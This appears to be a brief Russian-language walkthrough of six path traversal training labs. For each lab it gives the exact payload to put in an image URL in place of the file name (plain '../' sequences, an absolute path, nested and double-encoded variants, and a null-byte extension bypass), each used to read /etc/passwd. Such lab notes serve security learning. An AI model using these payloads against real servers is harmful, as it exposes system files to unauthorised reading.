+ Lab: File path traversal, simple case
  + Открываем любую картинку. В urlе вместо имени файла (например, "30.jpg") пишем "../../../../etc/passwd".
  + WIN.
+ Lab: File path traversal, traversal sequences blocked with absolute path bypass
  + Открываем любую картинку. В urlе вместо имени файла (например, "69.jpg") пишем "/etc/passwd".
  + WIN.
+ Lab: File path traversal, traversal sequences stripped non-recursively
  + Открываем любую картинку. В urlе вместо имени файла (например, "69.jpg") пишем "....//....//....//etc/passwd".
  + WIN.
+ Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
  + Открываем любую картинку. В urlе вместо имени файла (например, "30.jpg") пишем "..%252f..%252f..%252fetc%252fpasswd".
  + WIN.
+ Lab: File path traversal, validation of start of path
  + Открываем любую картинку. В urlе вместо имени файла (например, "43.jpg") пишем "/var/www/images/../../../etc/passwd ".
  + WIN.
+ Lab: File path traversal, validation of file extension with null byte bypass
  + Открываем любую картинку. В urlе вместо имени файла (например, "43.jpg") пишем "../../../etc/passwd%00.png ".
  + WIN.
